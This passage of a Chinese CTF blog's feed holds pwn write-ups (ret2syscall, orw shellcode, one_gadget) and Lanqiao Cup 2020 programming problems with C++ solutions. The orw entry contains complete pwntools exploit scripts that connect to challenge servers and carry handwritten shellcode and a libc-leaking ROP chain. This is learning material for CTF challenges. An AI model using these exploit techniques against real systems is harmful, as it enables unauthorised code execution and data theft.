alt="在这里插入图片描述"></p><p>发现是个syscall的题目<br>直接去看这个函数的汇编</p><p><img src="/article/Pwn_0xGame_01/20201022204851409.png" alt="在这里插入图片描述"></p><p>根据师傅们所说，我们需要让rax存入59，让syscall去调用execve函数 （ret2syscall？）</p><p><a href="https://github.com/torvalds/linux/blob/16f73eb02d7e1765ccab3d2018e0bd98eb93d973/arch/x86/entry/syscalls/syscall_64.tbl">syscall_64 GitHub查询</a></p><p>之后要构造出来  execve(“/bin/sh”,0,0) 拿取权限<br>找”/bin/sh”字符串<br>方法一：<br>在程序中有，找到它</p><p><img src="/article/Pwn_0xGame_01/20201022210119569.png" alt="在这里插入图片描述"></p><p>从’[‘数起到斜杠前面的空格’ ‘，再加上前面的04个字符，一共是22个，换成16进制是16h<br>所以”/bin/sh”的地址为：0x402016</p><p>方法二：<br>构造ROP链来寻找（这是看官方WriteUp看到的方法</p><p><code>ROPgadget --binary ./main --string &#39;/bin/sh&#39;</code></p><p><img src="/article/Pwn_0xGame_01/20201022210755704.png" alt="在这里插入图片描述"></p><p>找来找去，最后还是要用到csu init函数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"> text:00000000004011D8 loc_4011D8:                             ; CODE XREF: init+4C↓j</span><br><span class="line">.text:00000000004011D8                 mov     rdx, r14</span><br><span class="line">.text:00000000004011DB                 mov     rsi, r13</span><br><span class="line">.text:00000000004011DE                 mov     edi, r12d</span><br><span class="line">.text:00000000004011E1                 call    qword ptr [r15+rbx*8]</span><br><span class="line">.text:00000000004011E5                 add     rbx, 1</span><br><span class="line">.text:00000000004011E9                 cmp     rbp, rbx</span><br><span class="line">.text:00000000004011EC                 jnz     short loc_4011D8</span><br><span class="line">.text:00000000004011EE</span><br><span class="line">.text:00000000004011EE loc_4011EE:                             ; CODE XREF: init+31↑j</span><br><span class="line">.text:00000000004011EE                 add     rsp, 8</span><br><span class="line">.text:00000000004011F2                 pop     rbx</span><br><span class="line">.text:00000000004011F3                 pop     rbp</span><br><span class="line">.text:00000000004011F4                 pop     r12</span><br><span class="line">.text:00000000004011F6                 pop     r13</span><br><span class="line">.text:00000000004011F8                 pop     r14</span><br><span class="line">.text:00000000004011FA                 pop     r15</span><br><span class="line">.text:00000000004011FC                 retn</span><br><span class="line">.text:00000000004011FC ; &#125; &#x2F;&#x2F; starts at 4011A0</span><br><span class="line">.text:00000000004011FC init            endp</span><br><span class="line">.text:00000000004011FC</span><br></pre></td></tr></table></figure><p>咕咕咕~~~</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;Pwn-0xGame-01&quot;&gt;&lt;a href=&quot;#Pwn-0xGame-01&quot; class=&quot;headerlink&quot; title=&quot;Pwn_0xGame_01&quot;&gt;&lt;/a&gt;Pwn_0xGame_01&lt;/h1&gt;</summary>
    
    
    
    <category term="比赛WriteUp" scheme="https://trick.ink/categories/%E6%AF%94%E8%B5%9BWriteUp/"/>
    
    
  </entry>
  
  <entry>
    <title>program</title>
    <link href="https://trick.ink/article/program/"/>
    <id>https://trick.ink/article/program/</id>
    <published>2021-09-28T19:45:18.681Z</published>
    <updated>2021-07-24T06:31:32.655Z</updated>
    
    <content type="html"><![CDATA[<p>记录编程相关</p><span id="more"></span><h1 id="2020蓝桥杯省赛"><a href="#2020蓝桥杯省赛" class="headerlink" title="2020蓝桥杯省赛"></a>2020蓝桥杯省赛</h1><h2 id="A-门牌制作"><a href="#A-门牌制作" class="headerlink" title="A 门牌制作"></a>A 门牌制作</h2><p>【问题描述】<br>小蓝要为一条街的住户制作门牌号。<br>这条街一共有 2020 位住户，门牌号从 1 到 2020 编号。<br>小蓝制作门牌的方法是先制作 0 到 9 这几个数字字符，最后根据需要将字<br>符粘贴到门牌上，例如门牌 1017 需要依次粘贴字符 1、 0、 1、 7，即需要 1 个<br>字符 0， 2 个字符 1， 1 个字符 7。<br>请问要制作所有的 1 到 2020 号门牌，总共需要多少个字符 2？<br>【答案提交】<br>这是一道结果填空的题，你只需要算出结果后提交即可。本题的结果为一个整数，在提交答案时只填写这个整数，填写多余的内容将无法得分。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i,t,n=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">1</span>;i&lt;=<span class="number">2020</span>;i++)</span><br><span class="line"><span class="keyword">for</span>(t=i;t!=<span class="number">0</span>;t/=<span class="number">10</span>)</span><br><span class="line"><span class="keyword">if</span>(t%<span class="number">10</span>==<span class="number">2</span>)</span><br><span class="line">n++;</span><br><span class="line">cout&lt;&lt; n;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>624</p></blockquote><h2 id="试题B-既约分数"><a href="#试题B-既约分数" class="headerlink" title="试题B 既约分数"></a>试题B 既约分数</h2><p>【问题描述】<br>如果一个分数的分子和分母的最大公约数是1，这个分数称为既约分数。例如，3/4 , 5/2 , 1/8 , 7/1都是既约分数。请问，有多少个既约分数，分子和分母都是1 到2020 之间的整数（包括1和2020）？<br>【答案提交】<br>这是一道结果填空的题，你只需要算出结果后提交即可。本题的结果为一个整数，在提交答案时只填写这个整数，填写多余的内容将无法得分。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">int</span> num=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> k=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=<span class="number">2020</span>;i++)</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">1</span>;j&lt;=<span class="number">2020</span>;j++)</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">for</span>(k=i;;k--)</span><br><span class="line">    <span class="keyword">if</span>(i%k==<span class="number">0</span> &amp;&amp; j%k==<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span>(k==<span class="number">1</span>)</span><br><span class="line">    num++;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">cout&lt;&lt;num;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="试题C-蛇形填数"><a href="#试题C-蛇形填数" class="headerlink" title="试题C 蛇形填数"></a>试题C 蛇形填数</h2><p>【问题描述】<br>如下图所示，小明用从1 开始的正整数“蛇形”填充无限大的矩阵。</p><p><img src="/article/program/image-20210412201731138.png" alt="image-20210412201731138"></p><p>容易看出矩阵第二行第二列中的数是5。请你计算矩阵中第20 行第20 列的数是多少？</p><p>【答案提交】<br>这是一道结果填空的题，你只需要算出结果后提交即可。本题的结果为一个整数，在提交答案时只填写这个整数，填写多余的内容将无法得分。</p><h2 id="试题D-跑步锻炼"><a href="#试题D-跑步锻炼" class="headerlink" title="试题D 跑步锻炼"></a>试题D 跑步锻炼</h2><p>【问题描述】<br>小蓝每天都锻炼身体。<br>正常情况下，小蓝每天跑 1 千米。如果某天是周一或者月初（1 日），为了<br>激励自己，小蓝要跑 2 千米。如果同时是周一或月初，小蓝也是跑 2 千米。<br>小蓝跑步已经坚持了很长时间，从 2000 年 1 月 1 日周六（含）到 2020 年<br>10 月 1 日周四（含）。请问这段时间小蓝总共跑步多少千米？</p><p>【答案提交】<br>这是一道结果填空的题，你只需要算出结果后提交即可。本题的结果为一<br>个整数，在提交答案时只填写这个整数，填写多余的内容将无法得分。</p><h2 id="试题E-七段码"><a href="#试题E-七段码" class="headerlink" title="试题E 七段码"></a>试题E 七段码</h2><p>【问题描述】<br>小蓝要用七段码数码管来表示一种特殊的文字。</p><p>七段码上图给出了七段码数码管的一个图示，数码管中一共有7 段可以发光的二极管，分别标记为a, b, c, d, e, f, g。小蓝要选择一部分二极管（至少要有一个）发光来表达字符。在设计字符的表达时，要求所有发光的二极管是连成一片的。<br>例如：b 发光，其他二极管不发光可以用来表达一种字符。<br>例如：c 发光，其他二极管不发光可以用来表达一种字符。这种方案与上一行的方案可以用来表示不同的字符，尽管看上去比较相似。<br>例如：a, b, c, d, e 发光，f, g 不发光可以用来表达一种字符。<br>例如：b, f 发光，其他二极管不发光则不能用来表达一种字符，因为发光的二极管没有连成一片。<br>请问，小蓝可以用七段码数码管表达多少种不同的字符？</p><p>【答案提交】<br>这是一道结果填空的题，你只需要算出结果后提交即可。本题的结果为一<br>个整数，在提交答案时只填写这个整数，填写多余的内容将无法得分。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;记录编程相关&lt;/p&gt;</summary>
    
    
    
    <category term="program" scheme="https://trick.ink/categories/program/"/>
    
    
  </entry>
  
  <entry>
    <title>orw</title>
    <link href="https://trick.ink/article/orw/"/>
    <id>https://trick.ink/article/orw/</id>
    <published>2021-09-28T19:45:18.670Z</published>
    <updated>2021-07-24T06:32:49.541Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Shellcode"><a href="#Shellcode" class="headerlink" title="Shellcode"></a>Shellcode</h1><span id="more"></span><h2 id="HGame"><a href="#HGame" class="headerlink" title="HGame"></a>HGame</h2><h3 id="letter"><a href="#letter" class="headerlink" title="letter"></a>letter</h3><p><img src="https://raw.githubusercontent.com/YTrick/image/branch/image/20210307191837.png" alt="20210307191837"></p><p>程序禁用了一些系统调用，导致无法直接用 shellcode 直接getshell ，即 asm(shellcraft.sh())，所以得手写汇编 shellcode；因为程序是64位的，所以要写 context.arch = ‘amd64’</p><p><img src="https://raw.githubusercontent.com/YTrick/image/branch/image/20210307194929.png" alt="20210307194929"></p><p>负数溢出，但是没搞明白的是为什么是 -268376833 。。。。当事人非常郁闷</p><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment">#r = process(&#x27;./letter&#x27;)</span></span><br><span class="line">r=remote(<span class="string">&#x27;182.92.108.71&#x27;</span>,<span class="number">31305</span>)</span><br><span class="line">r.sendlineafter(<span class="string">&#x27;?&#x27;</span>,<span class="string">&#x27;-268376833&#x27;</span>)</span><br><span class="line"><span class="comment">#r.sendline(&#x27;a&#x27;*0x18+p64(0x60105c)+asm(shellcraft.sh()))</span></span><br><span class="line">shellcode = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">mov rax, 0x101010101010101</span></span><br><span class="line"><span class="string">push rax</span></span><br><span class="line"><span class="string">mov rax, 0x101010101010101 ^ 0x67616c66</span></span><br><span class="line"><span class="string">xor [rsp], rax</span></span><br><span class="line"><span class="string">mov rdi, rsp</span></span><br><span class="line"><span class="string">xor rsi, rsi</span></span><br><span class="line"><span class="string">xor rdx, rdx</span></span><br><span class="line"><span class="string">mov rax, 2</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">xor rax, rax</span></span><br><span class="line"><span class="string">mov rdi, 3</span></span><br><span class="line"><span class="string">mov rsi, 0x601070</span></span><br><span class="line"><span class="string">mov rdx, 0x100</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">mov rax, 1</span></span><br><span class="line"><span class="string">mov rdi, 1</span></span><br><span class="line"><span class="string">mov rsi, 0x601070</span></span><br><span class="line"><span class="string">mov rdx,0x100</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">r.sendline(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x18</span>+p64(<span class="number">0x60108C</span>)+asm(shellcode))</span><br><span class="line">r.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>发现其他师傅有另外的解法</p><p>exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./letter&#x27;</span>)</span><br><span class="line">context.arch = elf.arch</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pr</span>(<span class="params">a,addr</span>):</span></span><br><span class="line">log.success(a+<span class="string">&#x27;====&gt;&#x27;</span>+<span class="built_in">hex</span>(addr))</span><br><span class="line">write_plt = elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">write_got = elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">read_got = elf.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">prdi = <span class="number">0x400AA3</span></span><br><span class="line">p6 = <span class="number">0x400A9A</span></span><br><span class="line">mmmc = <span class="number">0x400A80</span></span><br><span class="line">vuln = <span class="number">0x400958</span></span><br><span class="line">p = remote(<span class="string">&#x27;182.92.108.71&#x27;</span>,<span class="number">31305</span>)</span><br><span class="line"><span class="comment">#p = process(&#x27;./letter&#x27;)</span></span><br><span class="line"><span class="comment">#gdb.attach(p,&#x27;b *0x4009BB&#x27;)</span></span><br><span class="line">p.sendafter(<span class="string">&#x27;?\n&#x27;</span>,<span class="built_in">str</span>(<span class="number">0xffffffff</span>).ljust(<span class="number">0x10</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x18</span>+p64(p6)+p64(<span class="number">0</span>)+p64(<span class="number">1</span>)+p64(write_got)+p64(<span class="number">1</span>)+p64(write_got)+p64(<span class="number">8</span>)</span><br><span class="line">payload += p64(mmmc)+<span class="string">&#x27;a&#x27;</span>*<span class="number">16</span>+p64(<span class="number">0x00601000</span>+<span class="number">0x500</span>+<span class="number">0x10</span>)+<span class="string">&#x27;a&#x27;</span>*<span class="number">32</span>+p64(<span class="number">0x4009DD</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;.\n&#x27;</span>)</span><br><span class="line">write_leak = u64(p.recv(<span class="number">8</span>))</span><br><span class="line">libcbase = write_leak - libc.sym[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">open_addr = libcbase + libc.sym[<span class="string">&#x27;open&#x27;</span>]</span><br><span class="line">pr(<span class="string">&#x27;libcbase&#x27;</span>,libcbase)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x18</span>+p64(<span class="number">0x00601000</span>+<span class="number">0x500</span>+<span class="number">0x10</span>+<span class="number">0x10</span>)+asm(shellcraft.<span class="built_in">open</span>(<span class="string">&#x27;flag&#x27;</span>))</span><br><span class="line">payload += asm(shellcraft.read(<span class="number">3</span>,<span class="number">0x00601000</span>+<span class="number">0x500</span>+<span class="number">0x100</span>,<span class="number">100</span>))</span><br><span class="line">payload += asm(shellcraft.write(<span class="number">1</span>,<span class="number">0x00601000</span>+<span class="number">0x500</span>+<span class="number">0x100</span>,<span class="number">100</span>))</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>搞不懂控制 rbp 为 0x00601000+0x500+0x10 是为什么。。。。</p><h1 id="pwnable-orw"><a href="#pwnable-orw" class="headerlink" title="pwnable_orw"></a>pwnable_orw</h1><p>保护</p><p><img src="/article/orw/image-20210421165427835.png" alt="image-20210421165427835"></p><p>IDA</p><p><img src="/article/orw/image-20210421165445322.png" alt="image-20210421165445322"></p><p>一道写shellcode 的题目，题目意思也很明显是用orw，在pwnable中flag文件是在/home/orw/flag中，但是在buu中直接在当前目录下就有flag文件。</p><p>写一个c程序再gcc -s 直接看汇编照着写就差不多了</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">100</span>];</span><br><span class="line">    <span class="keyword">int</span> fd;</span><br><span class="line"></span><br><span class="line">    fd = open(&#x27;flag&#x27;,0,0);</span><br><span class="line"></span><br><span class="line">    read(fd,buf,<span class="number">100</span>);</span><br><span class="line"></span><br><span class="line">    write(<span class="number">1</span>,buf,<span class="number">100</span>);</span><br><span class="line"></span><br><span class="line">    close(fd);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">.text:0000000000400666 ; __unwind &#123;</span><br><span class="line">.text:0000000000400666                 push    rbp</span><br><span class="line">.text:0000000000400667                 mov     rbp, rsp</span><br><span class="line">.text:000000000040066A                 add     rsp, 0FFFFFFFFFFFFFF80h</span><br><span class="line">.text:000000000040066E                 mov     rax, fs:28h</span><br><span class="line">.text:0000000000400677                 mov     [rbp+var_8], rax</span><br><span class="line">.text:000000000040067B                 xor     eax, eax</span><br><span class="line">.text:000000000040067D                 mov     edx, 0</span><br><span class="line">.text:0000000000400682                 mov     esi, 0          ; oflag</span><br><span class="line">.text:0000000000400687                 mov     edi, 666C6167h  ; file</span><br><span class="line">.text:000000000040068C                 mov     eax, 0</span><br><span class="line">.text:0000000000400691                 call    _open</span><br><span class="line">.text:0000000000400696                 mov     [rbp+fd], eax</span><br><span class="line">.text:0000000000400699                 lea     rcx, [rbp+buf]</span><br><span class="line">.text:000000000040069D                 mov     eax, [rbp+fd]</span><br><span class="line">.text:00000000004006A0                 mov     edx, 64h        ; nbytes</span><br><span class="line">.text:00000000004006A5                 mov     rsi, rcx        ; buf</span><br><span class="line">.text:00000000004006A8                 mov     edi, eax        ; fd</span><br><span class="line">.text:00000000004006AA                 mov     eax, 0</span><br><span class="line">.text:00000000004006AF                 call    _read</span><br><span class="line">.text:00000000004006B4                 lea     rax, [rbp+buf]</span><br><span class="line">.text:00000000004006B8                 mov     edx, 64h        ; n</span><br><span class="line">.text:00000000004006BD                 mov     rsi, rax        ; buf</span><br><span class="line">.text:00000000004006C0                 mov     edi, 1          ; fd</span><br><span class="line">.text:00000000004006C5                 mov     eax, 0</span><br><span class="line">.text:00000000004006CA                 call    _write</span><br><span class="line">.text:00000000004006CF                 mov     eax, [rbp+fd]</span><br><span class="line">.text:00000000004006D2                 mov     edi, eax        ; fd</span><br><span class="line">.text:00000000004006D4                 mov     eax, 0</span><br><span class="line">.text:00000000004006D9                 call    _close</span><br><span class="line">.text:00000000004006DE                 mov     eax, 0</span><br><span class="line">.text:00000000004006E3                 mov     rcx, [rbp+var_8]</span><br><span class="line">.text:00000000004006E7                 xor     rcx, fs:28h</span><br><span class="line">.text:00000000004006F0                 jz      short locret_4006F7</span><br><span class="line">.text:00000000004006F2                 call    ___stack_chk_fail</span><br></pre></td></tr></table></figure><p>open -&gt; read -&gt; write </p><p>open</p><ul><li>ecx = flags 置零即可</li><li>edx = mode 置零即可</li><li>ebx = filename 文件名</li><li>eax = 0x05 系统调用号</li></ul><p>read</p><ul><li>ebx = fd 文件指针，就是open的返回值，不需要改变</li><li>ecx = buf 缓冲区，指向栈顶位置</li><li>edx = count 字节数</li><li>eax = 0x03 系统调用号</li></ul><p>write</p><ul><li>ebx = fd 文件指针，置为1，打印到屏幕</li><li>ecx = buf 缓冲区，指向栈顶</li><li>edx = count</li><li>eax = 0x04 系统调用号</li></ul><p>exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&quot;node3.buuoj.cn&quot;</span>,<span class="number">25204</span>)</span><br><span class="line"><span class="comment">#p = remote(&#x27;chall.pwnable.tw&#x27;,10001)</span></span><br><span class="line"><span class="comment">#p = process(&#x27;./orw&#x27;)</span></span><br><span class="line"></span><br><span class="line">bss = <span class="number">0x804A060</span></span><br><span class="line"></span><br><span class="line">shellcode = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">xor ecx,ecx;</span></span><br><span class="line"><span class="string">xor edx,edx;</span></span><br><span class="line"><span class="string">push ecx;</span></span><br><span class="line"><span class="string">push 0x67616c66;</span></span><br><span class="line"><span class="string">mov ebx,esp;</span></span><br><span class="line"><span class="string">mov eax,0x5;</span></span><br><span class="line"><span class="string">int 0x80;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">mov ebx,eax;</span></span><br><span class="line"><span class="string">mov ecx,esp;</span></span><br><span class="line"><span class="string">mov edx,0x30;</span></span><br><span class="line"><span class="string">mov eax,0x3;</span></span><br><span class="line"><span class="string">int 0x80;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">mov ebx,0x1;</span></span><br><span class="line"><span class="string">mov edx,0x30;</span></span><br><span class="line"><span class="string">mov eax,0x4;</span></span><br><span class="line"><span class="string">int 0x80;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#p.recvuntil(&#x27;:&#x27;)</span></span><br><span class="line">p.send(asm(shellcode))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>((p.recv()))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;Shellcode&quot;&gt;&lt;a href=&quot;#Shellcode&quot; class=&quot;headerlink&quot; title=&quot;Shellcode&quot;&gt;&lt;/a&gt;Shellcode&lt;/h1&gt;</summary>
    
    
    
    <category term="WriteUp" scheme="https://trick.ink/categories/WriteUp/"/>
    
    
    <category term="orw" scheme="https://trick.ink/tags/orw/"/>
    
  </entry>
  
  <entry>
    <title>One_gadget</title>
    <link href="https://trick.ink/article/One_gadget/"/>
    <id>https://trick.ink/article/One_gadget/</id>
    <published>2021-09-28T19:45:18.659Z</published>
    <updated>2021-07-24T06:32:35.320Z</updated>
    
    <content type="html"><![CDATA[<h1 id="One-gadget"><a href="#One-gadget" class="headerlink" title="One_gadget"></a>One_gadget</h1><span id="more"></span><h2 id="BJDCTF-2nd-one-gadget"><a href="#BJDCTF-2nd-one-gadget" class="headerlink" title="[BJDCTF 2nd]one_gadget"></a>[BJDCTF 2nd]one_gadget</h2><p>ida看main函数</p><p><img src="https://img-blog.csdnimg.cn/20201127174547573.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1lhbmdaaVRyaWNr,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>再看init函数</p><p><img src="https://img-blog.csdnimg.cn/20201127174608655.png" alt="在这里插入图片描述"></p><p>会输出一个printf的地址</p><p>使用one_gadget，计算一下libc的基址<br>buuctf给了远程的libc文件，下载下来</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">one_gadget [libcfilename]</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20201127175251109.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1lhbmdaaVRyaWNr,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span 